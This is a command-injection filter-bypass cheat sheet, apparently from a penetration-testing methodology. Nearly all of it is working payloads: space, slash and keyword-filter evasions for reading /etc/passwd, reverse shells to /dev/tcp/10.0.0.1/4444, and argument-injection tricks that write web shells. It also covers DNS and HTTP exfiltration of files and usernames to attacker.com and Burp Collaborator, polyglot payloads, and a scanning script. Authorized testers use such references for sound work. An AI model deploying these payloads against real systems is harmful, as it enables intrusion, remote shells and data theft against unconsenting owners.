# Command Injection — Filter Bypass Techniques

Phase 6 exploitation reference. Use when command injection is confirmed but filters block execution.

---

## Bypass Without Space

When spaces are filtered/blocked, use these alternatives:

| # | Technique | Payload | Shell | Notes |
|---|-----------|---------|-------|-------|
| 1 | `$IFS` (Internal Field Separator) | `cat${IFS}/etc/passwd` | bash/sh | Default IFS = space/tab/newline |
| 2 | `${IFS}` (braced) | `ls${IFS}-la` | bash/sh | More reliable than bare `$IFS` in some contexts |
| 3 | Brace expansion | `{cat,/etc/passwd}` | bash | Shell expands braces as separate args |
| 4 | Input redirection | `cat</etc/passwd` | bash/sh | `<` reads file without space |
| 5 | Tab character | `;ls%09-al%09/home` | any | `%09` = tab (URL-encoded) |
| 6 | ANSI-C quoting | `X=$'uname\x20-a'&&$X` | bash | `\x20` = space inside `$'...'` |
| 7 | Windows env substring | `ping%CommonProgramFiles:~10,-18%127.0.0.1` | cmd.exe | Extracts space from env var |

### Practical Examples

```bash
# Read /etc/passwd without spaces
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Reverse shell without spaces
{bash,-i,>&,/dev/tcp/10.0.0.1/4444,0>&1}
bash$IFS-i$IFS>&$IFS/dev/tcp/10.0.0.1/4444$IFS0>&1
```

---

## Bypass Without Slash (`/`)

When `/` is filtered:

```bash
# Using environment variable substring
echo ${HOME:0:1}                    # Outputs: /
cat ${HOME:0:1}etc${HOME:0:1}passwd # cat /etc/passwd

# Using tr to generate slash from adjacent ASCII
echo . | tr '!-0' '"-1'            # Outputs: /
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd

# Using printf
cat $(printf '\x2f')etc$(printf '\x2f')passwd

# Using here-string with tr
cat $(tr '!-0' '"-1' <<< .)etc$(tr '!-0' '"-1' <<< .)passwd
```

---

## Bypass Keyword Filters (Command Name Blocked)

When specific commands like `cat`, `whoami`, `id` are blacklisted:

### Quote Insertion (breaks keyword matching, shell ignores quotes)

```bash
# Single quotes
w'h'o'am'i
wh''oami
'w'hoami
c'a't /etc/passwd
/b'i'n/s'h'

# Double quotes
w"h"o"am"i
wh""oami
"wh"oami
c"a"t /etc/passwd

# Backticks (empty command substitution)
wh``oami
ca``t /etc/passwd
```

### Backslash Insertion

```bash
w\ho\am\i
c\at /etc/passwd
/\b\i\n/////s\h
l\s -la
```

### Variable Expansion ($@ and $())

```bash
# $@ expands to nothing in this context
who$@ami
c$@at /etc/passwd

# $() empty subshell
who$()ami
c$()at /etc/passwd

# Partial command via echo
who$(echo am)i
who`echo am`i
c$(echo at) /etc/passwd
```

### Wildcard Execution

```bash
# Linux — use glob patterns to match binary paths
/???/??t /???/p??s??              # /bin/cat /etc/passwd
/???/???/????2                    # /usr/bin/base2 (varies)

# Windows
powershell C:\*\*2\n??e*d.*?     # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e  # calc
```

### Hex/Octal Encoding

```bash
# Hex encoding via echo -e
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"  # /etc/passwd
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

# Variable assignment with hex
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc

# Full command in hex
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`

# xxd reverse (hex string → binary)
cat `xxd -r -p <<< 2f6574632f706173737764`

# Base64 encoded command
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh    # cat /etc/passwd
bash<<<$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)
```

### Case Variation (Windows only)

```powershell
# Windows is case-insensitive for commands
wHoAmI
WhOaMi
NET USER
NeT uSeR
```

---

## Bypass With Line Returns

Commands separated by newlines (URL-encoded as `%0a`):

```bash
# Newline as command separator (Linux)
original_cmd%0als
original_cmd%0aid
original_cmd%0awhoami

# Carriage return + line feed (may bypass \n filters)
original_cmd%0d%0als
```

---

## Bypass With Backslash-Newline (Command Continuation)

Split a command across lines — shell treats `\` + newline as continuation:

```bash
# Split command name
c\
at /et\
c/pa\
sswd

# URL-encoded form
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

---

## Bypass With Brace Expansion

Bash brace expansion generates strings without spaces:

```bash
{,ip,a}                    # expands to: "" "ip" "a" → runs: ip a
{,ifconfig}                # runs: ifconfig
{,ifconfig,eth0}           # runs: ifconfig eth0
{l,-lh}s                   # runs: ls -lh (note: {prefix}suffix pattern)
{,echo,#test}              # runs: echo #test
{,$"whoami",}              # runs: whoami
{,/?s?/?i?/c?t,/e??/p??s??,}  # runs: cat /etc/passwd via globs
```

---

## Bypass With Tilde Expansion

```bash
echo ~+                    # Current working directory ($PWD)
echo ~-                    # Previous working directory ($OLDPWD)
# Useful when $PWD or pwd command is blocked
```

---

## Bypass With Variable Manipulation

```bash
# String replacement in variables
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}      # Removes "hhh/hm" → /etc/passwd
cat ${test//hh??hm/}       # Pattern removal → /etc/passwd

# Build command from parts
a=c;b=at;c=/etc/passwd;$a$b $c

# Reverse string
echo 'dwssap/cte/' | rev   # /etc/passwd
$(echo 'dmanohw' | rev)    # whoami
```

---

## Argument Injection

When you can only append arguments to an existing command (not inject new commands):

| Tool | Payload | Effect |
|------|---------|--------|
| Chrome/Chromium | `'--gpu-launcher="id>/tmp/foo"'` | Execute via GPU launcher |
| SSH | `'-oProxyCommand="touch /tmp/foo"' foo@foo` | Execute via ProxyCommand |
| psql | `-o'\|id>/tmp/foo'` | Output to pipe |
| curl | `-o webshell.php` | Write response to file |
| wget | `-O /var/www/html/shell.php` | Write to web root |
| tar | `--checkpoint=1 --checkpoint-action=exec=id` | Execute on checkpoint |
| find | `-exec id \;` | Execute per result |
| git | `--upload-pack="id"` | Execute via upload-pack |
| zip | `-T --unzip-command="sh -c id"` | Execute via test command |

### WorstFit Technique (Windows — Fullwidth Characters)

Windows ANSI "best fit" mapping converts fullwidth Unicode to ASCII equivalents:

```php
// Vulnerable PHP code using escapeshellarg()
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));

// Payload using fullwidth double quotes (U+FF02) instead of regular (U+0022)
// ＂ --use-askpass=calc ＂
// escapeshellarg() doesn't recognize fullwidth quotes → bypass
```

Fullwidth characters that map to dangerous ASCII:
- `＂` (U+FF02) → `"` (double quote)
- `＇` (U+FF07) → `'` (single quote)
- `＆` (U+FF06) → `&` (ampersand)
- `｜` (U+FF5C) → `|` (pipe)
- `＞` (U+FF1E) → `>` (redirect)

---

## Data Exfiltration (Blind Command Injection)

### Time-Based

```bash
# Confirm injection exists
& sleep 10 &                           # 10s delay = confirmed
& ping -c 10 127.0.0.1 &              # 10s delay (Linux)
& ping -n 10 127.0.0.1 &              # 10s delay (Windows)
| timeout /t 10 |                      # Windows alternative

# Extract data character by character
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
# 5s delay = first char is 's'
# No delay = first char is NOT 's'

# Automate extraction
for i in $(seq 1 20); do
  for c in {a..z} {0..9}; do
    time if [ $(whoami|cut -c $i) == $c ]; then sleep 2; fi
  done
done
```

### DNS-Based (Out-of-Band)

```bash
# Basic DNS callback (confirms execution)
& nslookup attacker.com &
& dig attacker.com &
& host attacker.com &

# Exfiltrate data via DNS subdomain
& nslookup `whoami`.BURP-COLLABORATOR-ID.oastify.com &
& dig `hostname`.ATTACKER.com &
& host $(cat /etc/hostname).ATTACKER.com &

# Multi-line exfiltration (encode with base32 for DNS-safe chars)
for i in $(cat /etc/passwd | base32 | fold -w 60); do
  host "$i.ATTACKER.com"
done

# Windows DNS exfil
& nslookup %USERNAME%.ATTACKER.com &
```

### HTTP-Based (Out-of-Band)

```bash
# Exfiltrate via HTTP request
& curl https://attacker.com/exfil?d=$(whoami) &
& wget -q "https://attacker.com/exfil?d=$(cat /etc/passwd | base64)" &

# POST full file contents
& curl -X POST -d @/etc/passwd https://attacker.com/collect &

# If curl/wget blocked, use /dev/tcp (bash built-in)
& echo $(whoami) > /dev/tcp/attacker.com/80 &
```

### File Write (if web root is writable)

```bash
# Write output to accessible file
& whoami > /var/www/html/output.txt &
& id > /var/www/static/cmdi.txt &

# Then fetch: https://target.com/output.txt
```

---

## Polyglot Payloads

Single payload that works regardless of quoting context:

```bash
# Works in: unquoted, single-quoted, double-quoted contexts
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Universal sleep polyglot
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

---

## Injection Context Detection

Before crafting bypass payloads, determine the injection context:

| Context | Detection | Breakout Strategy |
|---------|-----------|-------------------|
| Unquoted | `;id` works directly | Use any separator |
| Double-quoted | `$(id)` or `` `id` `` works (subshell inside dquotes) | `"; id; #` to break out |
| Single-quoted | Nothing executes inside single quotes | `'; id; #` to break out |
| Backtick context | Nested backticks | `\`; id; #` |
| `$()` context | Close the subshell | `); id; #` |

### Context Probing

```bash
# Step 1: Try basic separators
;id
|id
&id
$(id)
`id`

# Step 2: If none work, try breaking out of quotes
";id;"
';id;'
`";id;"`

# Step 3: If still blocked, try blind detection
;sleep 5;
";sleep 5;"
';sleep 5;'
$(sleep 5)
`sleep 5`
```

---

## Tricks

### Backgrounding (avoid timeout kills)

```bash
nohup sleep 120 > /dev/null &
# Process continues even if parent (injected command) is killed
```

### Remove trailing arguments

```bash
# -- signals end of options; everything after is treated as filename
injected_command -- 
# Or use comment character
injected_command #
```

### Chaining with existing command output

```bash
# Use xargs to pass output as argument
| xargs -I{} curl https://attacker.com/{}
# Use while read for line-by-line exfil
| while read l; do curl "https://attacker.com/$l"; done
```

---

## Testing Priority (Web App Context)

When testing for command injection in web applications, prioritize these injection points:

1. **PDF/report generators** — often shell out to wkhtmltopdf, LibreOffice
2. **Image processors** — ImageMagick, GraphicsMagick (delegate commands)
3. **File conversion** — ffmpeg, pandoc, document converters
4. **Email features** — sendmail/postfix invocation
5. **DNS/network tools** — ping, nslookup, traceroute wrappers
6. **Filename parameters** — if filename is used in shell commands
7. **Webhook/callback URLs** — if fetched via curl/wget subprocess
8. **Archive operations** — zip/unzip/tar with user-controlled filenames
9. **Git operations** — clone URL, branch name injection
10. **Monitoring/health endpoints** — custom scripts triggered via API

### Quick Detection Script

```bash
#!/bin/bash
# Test command injection on a parameter
TARGET="https://target.com/api/convert"
PARAM="filename"
COLLAB="YOUR-BURP-COLLABORATOR-ID.oastify.com"

echo "=== Testing Command Injection ==="

# Time-based detection
echo -n "Sleep 5: "
time curl -sk -o /dev/null "$TARGET" -d "$PARAM=test;sleep+5;#"

echo -n "Sleep 5 (no-space): "
time curl -sk -o /dev/null "$TARGET" -d "$PARAM=test;sleep\${IFS}5;#"

# OOB detection
echo "OOB (check collaborator): "
curl -sk -o /dev/null "$TARGET" -d "$PARAM=test;\$(nslookup+cmdi.$COLLAB);#"
curl -sk -o /dev/null "$TARGET" -d "$PARAM=test%0anslookup+cmdi.$COLLAB"
curl -sk -o /dev/null "$TARGET" -d "$PARAM=\`nslookup+cmdi.$COLLAB\`"
```

---

## Tools

- [commixproject/commix](https://github.com/commixproject/commix) — automated OS command injection exploitation
- [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) — OOB interaction server (DNS/HTTP/SMTP callbacks)
- Burp Collaborator — OOB detection built into Burp Suite Pro
